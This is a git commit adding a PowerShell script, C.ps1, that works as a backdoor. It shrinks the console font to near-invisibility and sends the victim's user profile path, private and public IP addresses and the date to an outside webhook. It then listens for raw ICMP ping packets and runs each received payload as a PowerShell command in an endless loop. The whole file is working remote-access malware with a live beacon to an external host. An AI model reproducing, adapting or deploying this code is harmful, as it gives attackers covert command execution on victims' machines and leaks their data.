b4763274afdd13726f1bfbf46a9af0171c1796e9
Jh1sc <105714284+jh1sc@users.noreply.github.com>
2023-02-16 06:41:58 +0800

    Add files via upload

---
+++ C.ps1
@@ -0,0 +1,56 @@
+﻿Add-Type -AssemblyName  Microsoft.VisualBasic, PresentationCore, PresentationFramework, System.Drawing, System.Windows.Forms, WindowsBase, WindowsFormsIntegration, System;Add-Type -TypeDefinition 'namespace Windows.Native{using System;using System.ComponentModel;using System.IO;using System.Runtime.InteropServices;public class Kernel32{public const uint FILE_SHARE_READ = 1;public const uint FILE_SHARE_WRITE = 2;public const uint GENERIC_READ = 0x80000000;public const uint GENERIC_WRITE = 0x40000000;public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);public const int STD_ERROR_HANDLE = -12;public const int STD_INPUT_HANDLE = -10;public const int STD_OUTPUT_HANDLE = -11;[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]public class CONSOLE_FONT_INFOEX{private int cbSize;public CONSOLE_FONT_INFOEX(){this.cbSize = Marshal.SizeOf(typeof(CONSOLE_FONT_INFOEX));}public int FontIndex;public short FontWidth;public short FontHeight;public int FontFamily;public int FontWeight;[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]public string FaceName;}public class Handles{public static readonly IntPtr StdIn = GetStdHandle(STD_INPUT_HANDLE);public static readonly IntPtr StdOut = GetStdHandle(STD_OUTPUT_HANDLE);public static readonly IntPtr StdErr = GetStdHandle(STD_ERROR_HANDLE);}[DllImport("kernel32.dll", SetLastError=true)]public static extern bool CloseHandle(IntPtr hHandle);[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]public static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPTStr)] string filename,uint access,uint share,IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,uint flagsAndAttributes,IntPtr templateFile);[DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]public static extern bool GetCurrentConsoleFontEx(IntPtr hConsoleOutput, bool bMaximumWindow, [In, Out] CONSOLE_FONT_INFOEX lpConsoleCurrentFont);[DllImport("kernel32.dll", SetLastError=true)]public static extern IntPtr GetStdHandle(int nStdHandle);[DllImport("kernel32.dll", SetLastError=true)]public static extern bool SetCurrentConsoleFontEx(IntPtr ConsoleOutput, bool MaximumWindow,[In, Out] CONSOLE_FONT_INFOEX ConsoleCurrentFontEx);public static IntPtr CreateFile(string fileName, uint fileAccess, uint fileShare, FileMode creationDisposition){IntPtr hFile = CreateFile(fileName, fileAccess, fileShare, IntPtr.Zero, creationDisposition, 0U, IntPtr.Zero);if (hFile == INVALID_HANDLE_VALUE){throw new Win32Exception();}return hFile;}public static CONSOLE_FONT_INFOEX GetCurrentConsoleFontEx(){IntPtr hFile = IntPtr.Zero;try{hFile = CreateFile("CONOUT$", GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE, FileMode.Open);return GetCurrentConsoleFontEx(hFile);}finally{CloseHandle(hFile);}}public static void SetCurrentConsoleFontEx(CONSOLE_FONT_INFOEX cfi){IntPtr hFile = IntPtr.Zero;try{hFile = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE, FileMode.Open);SetCurrentConsoleFontEx(hFile, false, cfi);}finally{CloseHandle(hFile);}}public static CONSOLE_FONT_INFOEX GetCurrentConsoleFontEx(IntPtr outputHandle){CONSOLE_FONT_INFOEX cfi = new CONSOLE_FONT_INFOEX();if (!GetCurrentConsoleFontEx(outputHandle, false, cfi)){throw new Win32Exception();}return cfi;}}}';$F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.FontWidth = 8; $F.FontHeight = 8; $F.FontFamily = 48; $F.FontWeight = 100; $F.FaceName = "Terminal"; [Windows.Native.Kernel32]::SetCurrentConsoleFontEx($F)
+
+function Send-Webhook {
+    param(
+        [string]$WebhookUrl,
+        [object]$Data
+    )
+    $json = $Data | ConvertTo-Json
+    Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body $json -ContentType "application/json"
+}
+
+$BindingIP = (Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress[0]
+#Ping Sender
+function Send {
+    param (
+        [ipaddress]$IP,
+        [string]$text
+    )
+    $sc = [System.Net.NetworkInformation.Ping]::new()
+    $PingOptions = [System.Net.NetworkInformation.PingOptions]::new()
+    $PingOptions.DontFragment = $true
+    $text = (([text.encoding]::ASCII).GetBytes($text + "~"))
+    $sc.Send([ipaddress]$IP, "20", $text, $PingOptions)
+} 
+
+#Ping receiver
+function Receive {
+    param (
+        [ipaddress]$BindingIP,
+        [int]$TimeOut = 20
+    )
+    $pRs = [System.Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
+    $pRs.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($BindingIP), 0))
+    $pRs.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
+    $buffer = new-object byte[] $pRs.ReceiveBufferSize
+    $pRs.ReceiveTimeout = $TimeOut
+    $pRs.Receive($buffer) | out-null
+    $FeedBack = ([System.Text.Encoding]::ASCII.GetString($buffer[28..255]))
+    try { $FeedBack = ($FeedBack.Substring(0, ($FeedBack.IndexOf("~")))) }catch {}
+    write-host $FeedBack
+}
+
+$payload = @{
+    "User" = "$($env:USERPROFILE)"
+    "Prv-IP" = "$((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress[0])"
+    "Pub-IP" = "$((Iwr -Uri "https://api.ipify.org").Content)"
+    "Date" = "$(get-date)"
+}
+
+Send-Webhook -WebhookUrl "https://octo.hk/vYqgOaRwfsyj3I0FxuLX" -Data $payload
+
+while (1) {
+    $r = (Receive $BindingIP 0)
+    
+    powershell.exe -c "$($r)"
+}
